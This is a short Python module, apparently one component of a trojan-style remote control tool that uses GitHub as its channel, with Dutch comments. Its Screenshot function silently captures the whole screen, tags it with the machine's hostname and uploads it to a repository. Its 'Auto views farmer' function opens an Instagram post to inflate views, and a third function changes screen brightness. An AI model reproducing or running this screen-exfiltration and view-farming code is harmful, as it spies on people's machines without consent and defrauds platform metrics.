# Local Manager: Executing initial tasks on local machine
from modules.repomanager import writeIMGToRepo
from datetime import datetime
from PIL import ImageGrab

import screen_brightness_control as sbc
import webbrowser
import platform


# BRON SCREENSHOT MAKEN
# https://nitratine.net/blog/post/how-to-take-a-screenshot-in-python-using-pil/
# Screenshot maken en op github zetten
def Screenshot():
    hostname = platform.node()
    time = datetime.now().strftime("%Y%m%d%H%M%S")

    filepath = f"result/{hostname}-{time}-screenshot.png"

    screenshot = ImageGrab.grab()
    screenshot.save(filepath, "PNG")
    writeIMGToRepo(filepath)


# Auto views farmer
def OpenBrowser():
    webbrowser.open("https://www.instagram.com/p/Cs9Sl0hgtK-/", new=0, autoraise=True)


# Brightness aanpassen
def ChangeBrightness(val):
    sbc.set_brightness(val)
